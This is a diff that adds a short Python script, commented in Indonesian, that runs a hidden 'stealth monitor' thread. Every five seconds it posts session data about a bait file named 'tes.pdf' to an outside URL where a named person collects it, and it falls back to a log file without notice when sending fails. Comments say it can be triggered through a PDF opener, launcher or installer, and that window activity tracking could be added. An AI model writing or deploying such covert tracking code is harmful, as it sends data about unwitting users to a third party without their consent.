@@ -1,0 +1,42 @@
+import time
+import threading
+import requests
+
+# ========= CONFIGURATION AREA ========= #
+TARGET_URL = "https://github.com/sha20714/tes.git"  # URL server tempat Elias terima data
+SEND_INTERVAL = 5  # detik
+FILENAME = "tes.pdf"  # file umpan
+# ===================================== #
+
+def monitor_session():
+    session_start = time.time()
+    while True:
+        duration = round(time.time() - session_start, 2)
+
+        payload = {
+            "filename": FILENAME,
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "session_duration": f"{duration} seconds",
+            # bisa ditambah: aktif window, mood analysis, dll
+        }
+
+        try:
+            requests.post(TARGET_URL, json=payload)
+        except Exception:
+            # Fallback silent logging if needed
+            with open("confetti_backup.log", "a") as f:
+                f.write(str(payload) + "\n")
+
+        time.sleep(SEND_INTERVAL)
+
+# Mulai monitor sebagai thread latar belakang
+def start_stealth_monitor():
+    t = threading.Thread(target=monitor_session, daemon=True)
+    t.start()
+
+# Pemicu: skrip ini bisa diload lewat pembuka PDF, launcher, atau app installer
+start_stealth_monitor()
+
+# Script tetap idle di background
+while True:
+    time.sleep(1)
